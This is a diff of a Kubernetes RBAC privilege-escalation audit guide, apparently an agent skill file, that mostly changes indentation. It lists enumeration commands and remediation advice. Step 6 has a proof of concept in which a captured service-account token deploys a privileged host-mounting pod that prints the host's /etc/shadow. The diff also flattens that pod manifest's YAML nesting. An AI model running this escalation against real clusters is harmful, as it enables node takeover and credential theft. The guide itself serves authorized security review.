@@ -1,13 +1,13 @@
 ---
 name: auditing-kubernetes-rbac-privilege-escalation
 description: >-
-  Finds over-permissive RBAC roles and service-account token abuse paths in a Kubernetes
-  cluster using kubectl auth can-i, rbac-police, kubectl-who-can, and rakkess, tracing which
-  subjects can escalate toward cluster-admin. Use when reviewing who can escalate privileges
-  in a cluster, hunting exploitable RoleBindings during an authorized review, or validating
-  least privilege after an RBAC change. Keywords: RBAC, ClusterRoleBinding, service account
-  token, auth can-i, rbac-police, escalate, bind, impersonate. Do not use for designing and
-  applying hardened RBAC - use implementing-rbac-hardening-for-kubernetes.
+ Finds over-permissive RBAC roles and service-account token abuse paths in a Kubernetes
+ cluster using kubectl auth can-i, rbac-police, kubectl-who-can, and rakkess, tracing which
+ subjects can escalate toward cluster-admin. Use when reviewing who can escalate privileges
+ in a cluster, hunting exploitable RoleBindings during an authorized review, or validating
+ least privilege after an RBAC change. Keywords: RBAC, ClusterRoleBinding, service account
+ token, auth can-i, rbac-police, escalate, bind, impersonate. Do not use for designing and
+ applying hardened RBAC - use implementing-rbac-hardening-for-kubernetes.
 domain: cybersecurity
 subdomain: container-security
 tags:
@@ -61,20 +61,20 @@ This skill systematically enumerates effective permissions for every subject, ma
 - `kubectl` configured against the target cluster (your own credentials, or a captured service-account token)
 - Read access to RBAC objects (most audits run with a cluster-reader or admin context)
 - Audit tooling:
-  ```bash
-  # rbac-police - find escalation paths (Cymulate)
-  curl -L https://github.com/PaloAltoNetworks/rbac-police/releases/latest/download/rbac-police-linux-amd64 -o rbac-police
-  chmod +x rbac-police
+ ```bash
+ # rbac-police - find escalation paths (Cymulate)
+ curl -L https://github.com/PaloAltoNetworks/rbac-police/releases/latest/download/rbac-police-linux-amd64 -o rbac-police
+ chmod +x rbac-police
 
-  # kubectl-who-can - which subjects can perform an action (Aqua)
-  kubectl krew install who-can
+ # kubectl-who-can - which subjects can perform an action (Aqua)
+ kubectl krew install who-can
 
-  # rakkess - access matrix of resources x verbs for the current/another subject
-  kubectl krew install access-matrix
+ # rakkess - access matrix of resources x verbs for the current/another subject
+ kubectl krew install access-matrix
 
-  # rbac-lookup - which roles a subject has (FairwindsOps)
-  kubectl krew install rbac-lookup
-  ```
+ # rbac-lookup - which roles a subject has (FairwindsOps)
+ kubectl krew install rbac-lookup
+ ```
 
 ## Objectives
 
@@ -106,12 +106,12 @@ kubectl get roles,rolebindings --all-namespaces -o wide
 
 # Dump full RBAC for offline analysis
 kubectl get clusterroles,clusterrolebindings,roles,rolebindings \
-  --all-namespaces -o yaml > rbac-dump.yaml
+ --all-namespaces -o yaml > rbac-dump.yaml
 
 # Who is bound to cluster-admin?
 kubectl get clusterrolebindings -o json | \
-  jq -r '.items[] | select(.roleRef.name=="cluster-admin") |
-         .metadata.name + " -> " + (.subjects // [] | map(.kind+"/"+.name) | join(","))'
+ jq -r '.items[] | select(.roleRef.name=="cluster-admin") |
+ .metadata.name + " -> " + (.subjects // [] | map(.kind+"/"+.name) | join(","))'
 ```
 
 ### Step 2: Enumerate Effective Permissions per Subject
@@ -121,17 +121,17 @@ kubectl get clusterrolebindings -o json | \
 ```bash
 # Full access matrix for a service account
 kubectl auth can-i --list \
-  --as=system:serviceaccount:default:default
+ --as=system:serviceaccount:default:default
 
 # Targeted dangerous-permission probes
 kubectl auth can-i create pods --all-namespaces \
-  --as=system:serviceaccount:dev:builder
+ --as=system:serviceaccount:dev:builder
 kubectl auth can-i get secrets --all-namespaces \
-  --as=system:serviceaccount:dev:builder
+ --as=system:serviceaccount:dev:builder
 kubectl auth can-i create serviceaccounts/token -n kube-system \
-  --as=system:serviceaccount:dev:builder
+ --as=system:serviceaccount:dev:builder
 kubectl auth can-i '*' '*' --all-namespaces \
-  --as=system:serviceaccount:dev:builder
+ --as=system:serviceaccount:dev:builder
 
 # rakkess full verb x resource matrix for a subject
 kubectl access-matrix --as system:serviceaccount:dev:builder
@@ -142,13 +142,13 @@ kubectl access-matrix --as system:serviceaccount:dev:builder
 ```bash
 # Who can perform each dangerous action across the cluster?
 kubectl who-can create pods
-kubectl who-can '*' '*'                      # wildcard god-mode holders
+kubectl who-can '*' '*' # wildcard god-mode holders
 kubectl who-can get secrets
 kubectl who-can list secrets
 kubectl who-can create pods/exec
 kubectl who-can impersonate users
 kubectl who-can create serviceaccounts/token
-kubectl who-can update clusterrolebindings   # bind-style escalation
+kubectl who-can update clusterrolebindings # bind-style escalation
 
 # grep the raw dump for escalate/bind/impersonate verbs and wildcards
 grep -nE 'escalate|impersonate|"\*"|- bind' rbac-dump.yaml
@@ -177,12 +177,12 @@ A finding only matters if a reachable workload mounts that token.
 ```bash
 # Map every pod to its service account
 kubectl get pods --all-namespaces \
-  -o custom-columns='NS:.metadata.namespace,POD:.metadata.name,SA:.spec.serviceAccountName'
+ -o custom-columns='NS:.metadata.namespace,POD:.metadata.name,SA:.spec.serviceAccountName'
 
 # Find pods that auto-mount tokens (the default) tied to risky SAs
 kubectl get pods --all-namespaces -o json | jq -r '
-  .items[] | select(.spec.automountServiceAccountToken != false) |
-  "\(.metadata.namespace)/\(.metadata.name) -> \(.spec.serviceAccountName // "default")"'
+ .items[] | select(.spec.automountServiceAccountToken != false) |
+ "\(.metadata.namespace)/\(.metadata.name) -> \(.spec.serviceAccountName // "default")"'
 
 # rbac-lookup: what does that service account actually hold?
 kubectl rbac-lookup builder --kind serviceaccount
@@ -199,24 +199,24 @@ export APISERVER=https://kubernetes.default.svc
 
 # Confirm the dangerous right
 kubectl --token="$TOKEN" --server="$APISERVER" --insecure-skip-tls-verify \
-  auth can-i create pods
+ auth can-i create pods
 
 # Schedule a privileged host-mounting pod (proves node/host takeover)
 cat <<'EOF' | kubectl --token="$TOKEN" --server="$APISERVER" \
-  --insecure-skip-tls-verify apply -f -
+ --insecure-skip-tls-verify apply -f -
 apiVersion: v1
 kind: Pod
 metadata: {name: escalate-poc, namespace: default}
 spec:
-  containers:
-  - name: x
-    image: alpine
-    command: ["/bin/sh","-c","cat /host/etc/shadow; sleep 1d"]
-    securityContext: {privileged: true}
-    volumeMounts: [{name: host, mountPath: /host}]
-  volumes: [{name: host, hostPath: {path: /}}]
+ containers:
+ - name: x
+ image: alpine
+ command: ["/bin/sh","-c","cat /host/etc/shadow; sleep 1d"]
+ securityContext: {privileged: true}
+ volumeMounts: [{name: host, mountPath: /host}]
+ volumes: [{name: host, hostPath: {path: /}}]
 EOF
-kubectl logs escalate-poc   # host /etc/shadow proves escalation
+kubectl logs escalate-poc # host /etc/shadow proves escalation
 ```
 
 ### Step 7: Report and Remediate
@@ -224,9 +224,9 @@ kubectl logs escalate-poc   # host /etc/shadow proves escalation
 ```bash
 # Generate a least-privilege-violation summary
 kubectl get clusterrolebindings -o json | jq -r '
-  .items[] | select(.roleRef.name=="cluster-admin") |
-  "FINDING cluster-admin bound to: " +
-  ((.subjects // []) | map(.kind+":"+.name) | join(", "))'
+ .items[] | select(.roleRef.name=="cluster-admin") |
+ "FINDING cluster-admin bound to: " +
+ ((.subjects // []) | map(.kind+":"+.name) | join(", "))'
 ```
 
 Remediation: replace wildcards with explicit verbs/resources; remove `escalate`/`bind`/`impersonate` unless required; set `automountServiceAccountToken: false` on workloads that do not call the API; scope `Role` (namespaced) over `ClusterRole` where possible; use `aggregationRule` carefully.
